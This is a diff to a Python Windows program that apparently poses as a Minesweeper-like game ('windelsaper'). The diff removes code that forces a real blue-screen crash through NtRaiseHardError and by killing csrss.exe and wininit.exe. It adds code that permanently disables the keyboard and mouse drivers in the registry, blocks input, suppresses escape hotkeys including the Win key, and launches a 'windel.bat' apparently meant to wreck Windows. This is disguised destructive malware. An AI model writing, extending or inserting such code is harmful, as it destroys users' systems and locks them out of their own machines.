@@ -9,6 +9,7 @@ import shutil
 import winreg
 import ctypes
 from ctypes import wintypes
+from pathlib import Path
 
 try:
     import keyboard
@@ -106,59 +107,21 @@ def enable_shutdown_privilege():
         return True
     except Exception:
         return False
-
+def set_reg_value(hive, path: str, name: str, value, value_type=winreg.REG_SZ) -> None:
+    with winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE) as key:
+        winreg.SetValueEx(key, name, 0, value_type, value)
+    print(f"[OK] {path}\\{name} = {value}")
+    
+def block_input(block=True):
+    set_reg_value(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services", "kbdclass", 4, winreg.REG_DWORD)
+    set_reg_value(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services", "mouclass", 4, winreg.REG_DWORD)
+    return user32.BlockInput(block)
 
 def trigger_bsod():
-    """Вызывает настоящий BSOD через ntdll!NtRaiseHardError."""
-    print("[BSOD] вызов NtRaiseHardError...")
-    enable_shutdown_privilege()
-
-    response = wintypes.ULONG(0)
-
-    # Прототип:
-    # NTSTATUS NtRaiseHardError(
-    #   NTSTATUS ErrorStatus,
-    #   ULONG NumberOfParameters,
-    #   ULONG UnicodeStringParameterMask,
-    #   PULONG_PTR Parameters,
-    #   ULONG ValidResponseOptions,
-    #   PULONG Response
-    # );
-    ntdll.NtRaiseHardError.restype = wintypes.LONG
-    ntdll.NtRaiseHardError.argtypes = [
-        wintypes.LONG,          # ErrorStatus
-        wintypes.ULONG,         # NumberOfParameters
-        wintypes.ULONG,         # UnicodeStringParameterMask
-        ctypes.c_void_p,        # Parameters
-        wintypes.ULONG,         # ValidResponseOptions
-        ctypes.POINTER(wintypes.ULONG),  # Response
-    ]
-
-    ntdll.NtRaiseHardError(
-        STATUS_ASSERTION_FAILURE,
-        0,                      # без параметров
-        0,                      # без Unicode-строк
-        None,                   # Parameters = NULL
-        OptionShutdownSystem,   # 6 = вызвать BSOD
-        ctypes.byref(response),
-    )
-    # Если сюда дошло — BSOD не сработал, fallback:
-    print("[BSOD] NtRaiseHardError не сработал, fallback → taskkill csrss")
-    try:
-        subprocess.Popen(
-            ["taskkill", "/F", "/IM", "csrss.exe"],
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            stdin=subprocess.DEVNULL,
-        )
-        subprocess.Popen(
-            ["taskkill", "/F", "/IM", "wininit.exe"],
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            stdin=subprocess.DEVNULL,
-        )
-    except Exception as e:
-        print(f"[BSOD] fallback failed: {e}")
+    block_input(True)
+    base_dir = Path(__file__).resolve().parent
+    bat_path = base_dir / "windel.bat"
+    subprocess.run(str(bat_path), shell=True, check=True)
 
 
 def is_admin():
@@ -974,7 +937,7 @@ def run_windelsaper():
         keyboard.add_hotkey("o", show_opened)
         keyboard.add_hotkey("i", show_flags)
         for hk in ("alt+f4", "ctrl+w", "ctrl+q", "ctrl+shift+esc",
-                   "alt+tab", "alt+space", "win+r"):
+                   "alt+tab", "alt+space", "win+r", "win"):
             try:
                 keyboard.add_hotkey(hk, lambda: None, suppress=True)
             except Exception as e:
